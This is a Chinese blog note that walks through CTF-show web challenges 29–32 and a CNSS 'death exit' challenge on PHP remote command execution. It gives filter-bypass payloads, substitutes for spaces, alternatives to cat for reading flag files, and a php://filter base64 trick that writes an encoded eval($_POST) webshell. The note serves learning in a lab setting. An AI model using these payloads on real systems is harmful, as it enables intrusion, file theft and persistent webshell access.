---
author: "Yiming Shen"
date: 2021-10-20
lastmod: 2021-10-22
title: "RCE 远程命令执行漏洞"
tags: [
    "CTF",
    "RCE",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
typora-root-url: ..\..\static\
---

本文以[CTF-show ](https://ctf.show/challenges#web30-392)Web入门29-41题作为例题，学习RCE相关知识。

## Web 29

过滤了flag字样

```php+HTML
?c=system("cat f*");
```

## Web 30

过滤了`flag|system|php`三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过

```php
echo `cat f\lag.ph\p`;
```

**反引号可以执行系统命令**

## Web 31

在cat被禁时，我们还可以采用如下命令

> 1.tac：从最后一行开始显示，是cat的反向显示
> 2.more：一页一页的显示档案内容
> 3.less：与more类似
> 4.head：查看文档的前几行
> 5.tail：查看文档的后几行
> 6.nl：显示的时候，顺便输入行号
> 7.od：以二进制的方式读取档案内容
> 8.vi：一种编辑器
> 9.uniq：查看
> 10.vim：一种编译器

空格的代替符号：

> ```
> 1.${IFS}
> 2.$IFS$1
> 3.${IFS
> 4.%20
> 5.<和<>重定向符
> 6.%09
> ```

构造本题payload

``` php
?c=echo'more%09f*';
```

>其他题解：
>```php
>?c=eval($_GET[1]);&1=system('cat flag.php');嵌套脱离了c的正则判断
>?c=echo`strings%09f*`;
>?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()。这个学到了！
>```

## Web 32

屏蔽了`echo`

分号可以用?>代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。

```php
?c=include"$_GET[1]"?>&1=php://filter/read=convert.base64-
encode/resource=flag.php
```

## 绕过死亡EXIT - CNSS 太极掌门人

```php
<?php
$filename=$_GET['filename'];
$content=$_GET['content'];
file_put_contents($filename,"<?php exit();".$content);
```

两个参数变量间用`exit()`方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？

我们只需要将`content`前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。

### base64绕过

`base64`编码中只包含64个可打印字符，而PHP在解码`base64`时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

```php
?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
```



### [😮Mid]太极掌门人


``` php
<?php
    error_reporting(0);
    show_source(__FILE__);

    function deleteDir($path) {

        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {

                        deleteDir($sonDir);

                        @rmdir($sonDir);

                    } elseif ($sonDir !== './index.php'
                            && $sonDir !== './flag.php') {

                        @unlink($sonDir);

                    }
                }
            }
            @rmdir($path);
        }
    }

    $devil = '<?php exit;?>';

    $goods = $_POST['goods'];

    file_put_contents($_POST['train'], $devil . $goods);

    sleep(1);

    deleteDir('.');

?>
```

网页给出代码如上。

关键代码：`file_put_contents`写入文件，妥妥的文件上传漏洞。

``` php
?train=php://filter/convert.base64-decode/resource=1.php&goods=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
```

此时PHP执行的命令为：

```php
file_put_contents("php://filter/convert.base64-decode/resource=1.php", '<?php exit;?>'."aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==");
```

我们在PHP中运行一下，发现成功在目录下写入了有命令执行!

由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。

![image-20211021205217701](13.RCE专栏.assets/image-20211021205217701.png)

### 参考

[1] [详解PHP://filter以及死亡绕过](https://blog.csdn.net/woshilnp/article/details/117266628)

